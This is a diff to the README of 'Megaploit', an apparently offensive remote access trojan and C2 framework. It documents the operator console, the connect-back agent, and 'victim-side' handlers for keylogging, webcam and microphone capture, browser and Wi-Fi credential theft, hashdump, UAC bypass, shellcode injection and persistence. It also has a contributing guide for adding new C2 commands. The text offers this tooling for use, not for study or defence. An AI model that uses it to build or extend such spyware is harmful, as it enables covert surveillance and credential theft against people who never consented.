-Runs a TCP accept loop in a background daemon thread. Each incoming connection passes through five hardening layers in order: IP allowlist → rate limiter → TLS upgrade → HMAC auth → session creation. Every outcome is written to `loot/audit.log`.
-
-```python
-Listener(bind_host, port, secret_key, on_session, ssl_context=None, allowed_ips=None)
-listener.start()   # non-blocking
-listener.stop()
-```
-
-`allowed_ips` — `list[str] | None`. Pass a list of IP strings to enable the allowlist; `None` (default) allows all IPs.
-
-```python
-build_ssl_context(certfile, keyfile) -> ssl.SSLContext
-```
-Returns a hardened server TLS context: TLS 1.2+, AEAD ciphers, no renegotiation, no compression, forward secrecy.
-
-```python
-build_agent_ssl_context() -> ssl.SSLContext
-```
-Returns a matching hardened client TLS context for the agent (cert verification disabled for self-signed certs).
-
-#### `commands.py`
-
-Command registry and dispatcher.
-
-```python
-@_cmd(name, usage="", help_text="", dangerous=False)
-def my_handler(session: Session, args: list[str]) -> CommandResult:
-    ...
-```
-
-Use the `@_cmd()` decorator to register a new built-in command.
-
-```python
-CommandResult(ok: bool, output: str = "", close_session: bool = False)
-```
-
-```python
-dispatch(session, raw_input) -> CommandResult
-```
-Parse `raw_input`, find the handler, call it. Forwards unrecognised input as a shell command.
-
-```python
-all_commands() -> dict[str, _CommandDef]
-```
-Returns the full command registry (used by the help renderer and dangerous-command gate).
-
-#### `cli.py` — `Console`
-
-The interactive operator console. Call `console.run(...)` to start. Internally manages the global prompt loop, session interaction loop, plugin loading, update checker, and all sub-command dispatchers.
-
----
-
-### megaploit.agent
-
-#### `connection.py`
-
-Persistent connect-back loop. Configuration constants patched by `generate`:
-
-| Constant | Default | Description |
-|---|---|---|
-| `LHOST` | `"127.0.0.1"` | Server IP to connect back to |
-| `PORT` | `4444` | Server port |
-| `USE_TLS` | `False` | Whether to wrap the socket in SSL |
-
-```python
-start(secret_key_path="secret.key")
-```
-Runs forever: connect → authenticate → run_shell → reconnect after delay.
-
-#### `shell.py` — `run_shell(conn)`
-
-The receive-execute-respond loop. Calls `handle(conn, cmd)` from `handlers.py` for each command received. Exits on `"exit"` or socket close.
-
-#### `handlers.py`
-
-All agent-side command implementations, registered with `@_register("name")`.
-
-| Handler | Description |
-|---|---|
-| `cd` | `os.chdir()` + return new CWD |
-| `sysinfo` | Platform info via `platform` + `getpass` + `pyautogui.size()` |
-| `upload` | Receive a file from the server (`recv_file`) |
-| `download` | Send a file to the server (`send_file`) |
-| `screenshot` | `pyautogui.screenshot()` → `send_file` |
-| `record` | `sounddevice.rec()` + `soundfile.write()` → `send_file` |
-| `screen_stream` | Start/stop the Flask desktop MJPEG server in a daemon thread |
-| `webcam` | Start/stop the Flask webcam MJPEG server in a daemon thread |
-| `persist` | Windows Run-key registry persistence |
-| `keylog_start` | Start a `Keylogger` instance in a daemon thread |
-| `keylog_dump` | Read `KEYLOG_PATH` and return contents |
-| `keylog_stop` | Stop the keylogger and delete the log file |
-| `forkbomb` | `os.fork()` (Unix only) |
-
-Unrecognised commands fall through to `_shell_exec(cmd)` which runs them via `subprocess.Popen(shell=True)`.
-
-#### `keylogger.py` — `Keylogger`
-
-Uses `pynput.keyboard.Listener`. Appends keystrokes to `KEYLOG_PATH` with special-key labelling (`[Backspace]`, `[Shift]`, etc.).
-
-```python
-keylogger.start()       # blocks (run in daemon thread)
-keylogger.stop()        # sets threading.Event; listener exits
-keylogger.read_logs()   # returns file contents as str
-keylogger.destroy()     # stop + delete log file
-```
-
----
-
-### megaploit.streaming
-
-#### `screen.py` — `Camera`
-
-Singleton-style screen grabber. Uses `mss` for fast screen capture and OpenCV for JPEG encoding. A single background daemon thread captures at ~30 fps and stores the latest JPEG frame in a class variable. The thread auto-stops after 10 seconds of inactivity.
-
-```python
-camera = Camera()
-frame: bytes | None = camera.get_frame()  # latest JPEG bytes
-```
-
-#### `desktop.py`
-
-Flask app at port 5000. Route `/` serves `templates/desktop.html`; route `/video_feed` returns an MJPEG stream from `Camera`.
-
-#### `webcam.py`
-
-Flask app at port 5001. Reads from `cv2.VideoCapture(0)`. Supports greyscale, negative, and face-crop (DNN) filters. Server-side video recording via `cv2.VideoWriter`.
-
-Routes:
-- `GET /` — `templates/webcam.html` with control buttons
-- `GET /video_feed` — MJPEG stream
-- `POST /control` — toggle actions: `toggle_grey`, `toggle_neg`, `toggle_face`, `toggle_cam`, `capture`, `toggle_rec`
-
----
-
-### megaploit.toolbox
-
-#### `registry.py` — `ToolRegistry` / `Tool`
-
-Persistent JSON catalogue at `tools/tools.json`.
-
-```python
-Tool(name, repo, description, entry, lang, run_cmd, installed_at, tags)
-tool.path          # absolute path to cloned repo
-tool.entry_path    # absolute path to entry-point
-tool.is_installed  # bool — directory exists
-tool.resolved_run_cmd() -> list[str]  # run_cmd with {entry} expanded
-```
-
-```python
-registry.add(tool)
-registry.remove(name)
-registry.get(name) -> Tool | None
-registry.all() -> list[Tool]
-registry.search(query) -> list[Tool]  # searches name, description, lang, tags
-```
-
-Language ID constants: `LANG_PYTHON`, `LANG_GO`, `LANG_RUST`, `LANG_NODE`, `LANG_RUBY`, `LANG_JAVA`, `LANG_BASH`, `LANG_POWERSHELL`, `LANG_BINARY`, `LANG_UNKNOWN`.
-
-#### `installer.py`
-
-```python
-install(repo_url, name, description="", entry="", tags=None, progress=None) -> Tool
-uninstall(name, progress=None)
-update(name, progress=None)          # git pull + rebuild
-detect_language(repo_dir) -> str
-build(repo_dir, name, lang, progress) -> list[str]   # returns run_cmd
-detect_entry(repo_dir, name, lang) -> str             # returns relative path
-```
-
-`progress` is a `Callable[[str], None]` that receives build log lines.
-
-#### `runner.py`
-
-```python
-run_local(name, tool_args, output=None, timeout=None) -> int
-```
-Resolves `tool.resolved_run_cmd()`, spawns a subprocess, streams stdout/stderr to `output`, returns exit code.
-
-```python
-run_remote(name, tool_args, session, output=None, timeout=120)
-```
-Language-aware upload and execution over the C2 channel.
-
-#### `updater.py` — `UpdateChecker`
-
-```python
-checker = UpdateChecker(megaploit_dir=".")
-checker.start()     # starts daemon thread (silent if git not on PATH)
-checker.stop()
-checker.drain() -> Iterator[str]   # yield formatted ANSI update notes
-checker.check_now()                # trigger immediate check
-```
-
-Checks every `CHECK_INTERVAL` seconds (default: 300). Uses `git ls-remote origin HEAD` — read-only, never modifies the repo.
-
----
-
-### megaploit.plugins
-
-#### `schema.py` — `Plugin` / `PluginCommand`
-
-```python
-Plugin.from_toml(path) -> Plugin   # parse and validate a .toml file
-```
-
-```python
-@dataclass
-class PluginCommand:
-    name: str
-    kind: str          # "local" | "session" | "python"
-    description: str
-    usage: str
-    shell: str         # for kind=local or kind=session
-    handler: str       # dotted path for kind=python
-    min_args: int
-    dangerous: bool
-```
-
-#### `loader.py` — `PluginLoader`
-
-```python
-plugin_loader.load_all() -> tuple[int, int]   # (loaded, errors); also works as reload
-plugin_loader.plugins() -> list[Plugin]
-plugin_loader.get(name) -> Plugin | None
-plugin_loader.get_command(name) -> PluginCommand | None
-plugin_loader.all_command_names() -> list[str]
-plugin_loader.is_plugin_command(name) -> bool
-plugin_loader.errors() -> list[tuple[str, str]]  # (filename, message)
-```
-
-#### `runner.py` — `run_plugin_command`
-
-```python
-run_plugin_command(
-    cmd: PluginCommand,
-    args: list[str],
-    session=None,
-    lhost="",
-    port=0,
-    output=None,
-) -> CommandResult
-```
-
-Dispatches to `_run_local`, `_run_session`, or `_run_python` based on `cmd.kind`. All backends expand `{placeholder}` strings before execution.
+On startup the console prints a **key fingerprint** (first 16 hex chars of `SHA-256(key)`) so you can verify both sides share the same key without exposing it.
 
 ---
 
@@ -1012,26 +562,178 @@ Dispatches to `_run_local`, `_run_session`, or `_run_python` based on `cmd.kind`
 All C2 traffic travels on a single persistent TCP connection per session.
 
 ```
-Client                            Server
-  |                                 |
-  |  <─── 16-byte random challenge  |   (server sends first)
-  |                                 |
-  |  HMAC-SHA256(key, challenge) ──>|   (agent responds with 32-byte digest)
-  |                                 |
-  |  [connected — begin commands]   |
-  |                                 |
-  |  <── JSON payload + SENTINEL    |   (server sends command)
-  |                                 |
-  |  JSON response + SENTINEL ─────>|   (agent sends result)
-  |           OR                    |
-  |  raw bytes + SENTINEL ─────────>|   (agent sends file: screenshot, recording, download)
+Client (agent)                    Server (operator)
+  │                                     │
+  │  <── 16-byte random challenge       │   server sends first
+  │                                     │
+  │  HMAC-SHA256(key, challenge) ──────>│   32-byte digest
+  │                                     │
+  │      [authenticated — begin loop]   │
+  │                                     │
+  │  <── [4B length] [JSON command]     │   server sends command
+  │                                     │
+  │  [4B length] [JSON response] ──────>│   agent sends result
+  │            OR                       │
+  │  [4B length]["FILE_OK"] ───────────>│   agent signals file incoming
+  │  [4B length] [raw file bytes] ─────>│   agent sends binary file
 ```
 
-**Message framing**: every JSON message is terminated with `b"<<MEGAPLOIT_END>>"`. The receiver buffers until it sees the sentinel, then decodes the preceding bytes as JSON.
+### Message Framing
 
-**File transfers**: raw bytes streamed to the socket, terminated with `b"<<MEGAPLOIT_END>>"`. A partial-sentinel buffering scheme ensures the sentinel is never accidentally split across write calls.
+Every message (text or file) is framed with a **4-byte big-endian unsigned integer** length prefix followed by the payload bytes:
 
-**Why JSON + sentinel?** It avoids length-prefix framing complexity, works transparently through TLS, and makes the protocol trivially debuggable with `nc`.
+```
+[ uint32 payload_length (4 bytes, network byte order) ][ payload bytes ]
+```
+
+This replaces the old `b"<<MEGAPLOIT_END>>"` sentinel scheme. The sentinel approach was fragile: if the sentinel byte sequence appeared inside binary data (e.g. a PNG screenshot, WAV recording, or compiled binary) it would silently corrupt the transfer. Length-prefix framing has no such ambiguity.
+
+### File Transfer Handshake
+
+Before sending a binary file, the agent sends a `"FILE_OK"` status message. The server reads this status first:
+
+- If the agent could not produce the file (missing dependency, permission error, etc.) it returns an error string instead of `"FILE_OK"`. The server displays the error to the operator — **no corrupt file is written to disk**.
+- If the agent sends `"FILE_OK"`, the server proceeds with `recv_file`.
+
+This handshake is why screenshots, recordings, downloads, timelapse zips, and screen recordings are always either a valid file or a clear error — never a corrupt unusable blob.
+
+---
+
+## Module Reference
+
+### megaploit.core
+
+#### `config.py` — Shared constants
+
+| Constant | Default | Description |
+|---|---|---|
+| `AUTH_TIMEOUT` | `10` | Seconds before authentication times out |
+| `RECONNECT_DELAY` | `10` | Base seconds the agent waits before reconnecting |
+| `RECONNECT_JITTER` | `5` | Random 0–5 s added to each reconnect delay |
+| `MAX_AUTH_ATTEMPTS_PER_MIN` | `5` | Per-IP rate limit before auto-ban |
+| `IP_BAN_DURATION` | `300` | Seconds a banned IP stays blocked |
+| `SCREEN_STREAM_PORT` | `5000` | Port for the desktop MJPEG server |
+| `WEBCAM_STREAM_PORT` | `5001` | Port for the webcam MJPEG server |
+| `MAX_RECORD_SECONDS` | `300` | Maximum microphone recording length |
+| `AUDIT_LOG` | `"loot/audit.log"` | Path to the audit log |
+
+#### `protocol.py` — Wire protocol
+
+```python
+send_msg(conn, data)              # JSON-encode, 4-byte length-prefix, send
+recv_msg(conn) -> str             # Read length header then payload; return decoded string
+send_file(conn, path)             # 4-byte length + raw file bytes
+recv_file(conn, path, timeout)    # Read length header then raw bytes; write to path
+```
+
+All framing uses `struct.pack("!I", length)` — a 4-byte big-endian unsigned int. There is no sentinel. Binary data is never altered or scanned.
+
+#### `crypto.py` — HMAC-SHA256 authentication
+
+```python
+load_key(path="secret.key") -> bytes
+key_fingerprint(key: bytes) -> str
+server_authenticate(conn, secret_key, timeout=10) -> bool
+agent_authenticate(conn, secret_key, timeout=15) -> bool
+```
+
+---
+
+### megaploit.server
+
+#### `session.py` — `Session`
+
+| Field | Type | Description |
+|---|---|---|
+| `conn` | `socket.socket` | The connected socket |
+| `ip` | `str` | Agent IP address |
+| `port` | `int` | Agent source port |
+| `id` | `int` | Sequential session ID |
+| `connected_at` | `float` | Unix timestamp of connection |
+
+Methods: `close()`, `screenshot_path()` (includes UTC timestamp), `recording_path()`, `download_path(name)`.
+
+#### `commands.py` — Command registry and dispatcher
+
+```python
+@_cmd(name, usage="", help_text="", dangerous=False)
+def cmd_handler(session: Session, args: list[str]) -> CommandResult: ...
+
+CommandResult(ok: bool, output: str = "", close_session: bool = False)
+
+dispatch(session, raw_input) -> CommandResult
+all_commands() -> dict[str, _CommandDef]
+```
+
+All dispatched commands are written to `loot/audit.log`. File-receiving commands use `_recv_file_or_err()` which reads the agent's `FILE_OK` / error handshake before calling `recv_file`.
+
+#### `listener.py` — `Listener`
+
+```python
+Listener(bind_host, port, secret_key, on_session, ssl_context=None, allowed_ips=None)
+listener.start()   # non-blocking
+listener.stop()
+```
+
+Five hardening layers per connection, in order: IP allowlist → rate limiter → TLS upgrade → HMAC auth → session creation.
+
+#### `cli.py` — `Console`
+
+Interactive operator console. Manages the global prompt loop, session interaction loop, plugin loading, update checker, and all sub-command dispatchers. The `toolbox install/list/etc.` commands are intercepted at the global level and never forwarded to the agent shell.
+
+---
+
+### megaploit.agent
+
+#### `handlers.py` — All victim-side command implementations
+
+Every handler is registered with `@_register("name")`. Handlers that send a binary file always send `send_msg(conn, "FILE_OK")` immediately before `send_file(conn, path)`. On failure they return an error string (which `shell.py` sends back as a normal message) — the server's `_recv_file_or_err()` handles the distinction cleanly.
+
+| Category | Handlers |
+|---|---|
+| Shell / filesystem | `cd`, `sysinfo`, `upload`, `download`, `zip_download`, `search` |
+| Screen / audio | `screenshot`, `screenshot_timelapse`, `screenrecord`, `record`, `mic_level` |
+| Streaming | `screen_stream`, `webcam` |
+| Credential harvesting | `browser_creds`, `browser_history`, `wifi_passwords`, `hashdump`, `cred_vault`, `ssh_harvest`, `sudo_sniff` |
+| Pivoting | `portfwd`, `socks5`, `reverse_shell` |
+| Evasion / escalation | `lock_screen`, `token_steal`, `uac_bypass`, `living_off_land` |
+| Code injection | `inject_shellcode`, `dll_inject` |
+| Keylogger | `keylog_start`, `keylog_dump`, `keylog_stop` |
+| Persistence / cleanup | `persist`, `self_destruct`, `forkbomb` |
+| GUI control | `msgbox`, `mouse_move`, `type_keys`, `idle_time` |
+
+Unrecognised commands fall through to `_shell_exec(cmd)` — `subprocess.Popen(shell=True, cwd=os.getcwd())`.
+
+#### `keylogger.py` — `Keylogger`
+
+Uses `pynput.keyboard.Listener`. Methods: `start()`, `stop()`, `read_logs()`, `destroy()`.
+
+---
+
+### megaploit.streaming
+
+- **`screen.py`** — `Camera` singleton: `mss` screen capture at ~30 fps, OpenCV JPEG encoding, auto-stops after 10 s of inactivity
+- **`desktop.py`** — Flask app (port 5000): `/` → `desktop.html`; `/video_feed` → MJPEG from `Camera`
+- **`webcam.py`** — Flask app (port 5001): greyscale/negative/face-crop filters, server-side recording. `POST /control` toggles: `toggle_grey`, `toggle_neg`, `toggle_face`, `toggle_cam`, `capture`, `toggle_rec`
+
+Each streaming server is tracked in a `dict[int, thread]` keyed by port — starting `webcam` and `screen_stream` simultaneously no longer causes a conflict.
+
+---
+
+### megaploit.toolbox
+
+- **`registry.py`** — `Tool` dataclass + `ToolRegistry` (persistent `tools.json`)
+- **`installer.py`** — multi-language build system; `install`, `uninstall`, `update`, `detect_language`, `build`, `detect_entry`
+- **`runner.py`** — `run_local`, `run_remote`; uses `_upload_file()` helper that correctly drains the agent's ack after each file upload, preventing protocol desync
+- **`updater.py`** — `UpdateChecker`: background `git ls-remote` checks every 300 s; `drain()` yields formatted update notes
+
+---
+
+### megaploit.plugins
+
+- **`schema.py`** — `Plugin.from_toml(path)`, `PluginCommand` dataclass (`name`, `kind`, `description`, `shell`, `handler`, `min_args`, `dangerous`)
+- **`loader.py`** — `PluginLoader`: `load_all()`, `get(name)`, `get_command(name)`, `is_plugin_command(name)`, `errors()`
+- **`runner.py`** — `run_plugin_command(cmd, args, session, lhost, port, output)` dispatches to `_run_local`, `_run_session`, or `_run_python`
 
 ---
 
@@ -1047,47 +749,45 @@ Megaploit-main/
 ├── cert.pem / key.pem               TLS certificate and key (optional)
 │
 ├── plugins/                         Community plugin files
-│   └── example.toml                 Documented example covering all three command kinds
+│   └── example.toml
 │
 ├── tools/                           Toolbox — cloned repos land here
 │   └── tools.json                   Persistent tool catalogue
 │
 ├── loot/                            All collected files
-│   ├── screenshots/
-│   ├── recordings/
-│   └── downloads/
+│   ├── screenshots/                 shot_<ip>_<utc>_<n>.png
+│   ├── recordings/                  rec_<ip>_<utc>_<n>.wav
+│   ├── downloads/                   <n>_<filename>
+│   └── audit.log                    Connection + command audit trail
 │
 ├── saved_model/                     Optional: DNN face-detection model for webcam
 │   ├── deploy.prototxt.txt
 │   └── res10_300x300_ssd_iter_140000.caffemodel
 │
 └── megaploit/
-    ├── __init__.py                  Package root (version string)
     ├── core/
     │   ├── config.py                Shared constants
     │   ├── crypto.py                HMAC authentication
-    │   └── protocol.py             send_msg / recv_msg / send_file / recv_file
+    │   └── protocol.py             4-byte length-prefix framing for all messages + files
     ├── server/
-    │   ├── cli.py                   Interactive console (main server file)
-    │   ├── commands.py              @_cmd decorated command registry
-    │   ├── listener.py              TCP accept loop + TLS + auth
-    │   └── session.py               Session dataclass
+    │   ├── cli.py                   Interactive console
+    │   ├── commands.py              @_cmd registry + _recv_file_or_err handshake helper
+    │   ├── listener.py              TCP accept loop + TLS + auth + rate limiter
+    │   └── session.py               Session dataclass (UTC-stamped loot paths)
     ├── agent/
     │   ├── connection.py            Connect-back loop (LHOST/PORT/USE_TLS patched here)
-    │   ├── handlers.py              All victim-side command handlers
+    │   ├── handlers.py              All victim-side handlers; FILE_OK handshake before each file send
     │   ├── keylogger.py             pynput keystroke logger
-    │   └── shell.py                 recv → execute → respond loop
+    │   └── shell.py                 recv → handle → respond loop
     ├── streaming/
     │   ├── screen.py                Camera class (mss + OpenCV, ~30fps)
     │   ├── desktop.py               Flask MJPEG desktop stream (:5000)
     │   ├── webcam.py                Flask MJPEG webcam stream (:5001)
     │   └── templates/
-    │       ├── desktop.html
-    │       └── webcam.html
     ├── toolbox/
-    │   ├── registry.py              Tool dataclass + ToolRegistry (tools.json)
+    │   ├── registry.py              Tool dataclass + ToolRegistry
     │   ├── installer.py             Multi-language build system
-    │   ├── runner.py                Local + remote execution per language
+    │   ├── runner.py                Local + remote execution; _upload_file ack-drain helper
     │   └── updater.py               Background git update checker
     └── plugins/
         ├── schema.py                Plugin + PluginCommand dataclasses + TOML parser
@@ -1099,9 +799,9 @@ Megaploit-main/
 
 ## Contributing
 
-### Adding a Built-in Server Command
+### Adding a Built-in Command
 
-Register a new handler in [`megaploit/server/commands.py`](megaploit/server/commands.py):
+Register the handler on the **server** side in [`megaploit/server/commands.py`](megaploit/server/commands.py):
 
 ```python
 @_cmd("mycommand", usage="mycommand <arg>", help_text="Does something useful")
@@ -1112,12 +812,32 @@ def cmd_mycommand(session: Session, args: list[str]) -> CommandResult:
     return _ok(recv_msg(session.conn))
 ```
 
-Add the corresponding handler on the agent side in [`megaploit/agent/handlers.py`](megaploit/agent/handlers.py):
+If the command receives a file, use `_recv_file_or_err` instead of calling `recv_file` directly:
+
+```python
+err = _recv_file_or_err(session.conn, local_path, timeout=30)
+if err:
+    return err
+return _ok(f"[+] Saved to: {local_path}")
+```
+
+Register the corresponding handler on the **agent** side in [`megaploit/agent/handlers.py`](megaploit/agent/handlers.py):
 
 ```python
 @_register("mycommand")
 def _mycommand(conn, args: list[str]) -> str:
     return f"[+] Got: {args[0]}"
+```
+
+If the handler sends a file, emit `"FILE_OK"` first:
+
+```python
+@_register("mycommand")
+def _mycommand(conn, args: list[str]) -> str | None:
+    # ... produce the file ...
+    _send_msg(conn, "FILE_OK")
+    _send_file(conn, path)
+    return None   # shell.py sends nothing when handler returns None
 ```
 
 ### Adding a Plugin (No Python Required)
@@ -1130,13 +850,12 @@ Create `plugins/myplugin.toml` — see [`plugins/example.toml`](plugins/example.
 megaploit > toolbox install https://github.com/user/repo toolname "description" --tags tag1,tag2
 ```
 
-No code changes required. The installer handles any supported language automatically.
+No code changes required.
 
 ### Code Style
 
-- Python 3.10+ type hints throughout
-- `from __future__ import annotations` in every module
+- Python 3.10+ type hints throughout; `from __future__ import annotations` in every module
 - `@dataclass` for all data structures
-- No global mutable state outside of the module-level singletons (`registry`, `plugin_loader`)
-- Every public function/class has a docstring
-- ANSI colour output via the `_c()` helper in `cli.py`; no colour in library modules
+- ANSI colour output via the `_c()` helper in `cli.py` — no colour in library modules
+- Every new C2 command must have both a server-side dispatcher and an agent-side handler
+- Only add commands that do something a plain interactive shell cannot do
